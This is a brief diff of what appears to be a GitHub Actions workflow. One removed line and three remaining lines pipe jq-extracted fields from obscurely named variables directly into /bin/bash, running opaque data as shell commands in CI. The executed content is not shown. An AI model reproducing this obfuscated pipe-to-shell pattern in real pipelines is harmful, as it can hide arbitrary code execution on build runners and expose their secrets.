@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$drd29930" | jq -r .z218 | /bin/bash
           printf '%s' "$wuhej1" | jq -r .ma32093 | /bin/bash
           echo $h9 | jq -r .rgji20906 | /bin/bash
-          printf '%s' "$mbi89610" | jq -r .cbxgg43094 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
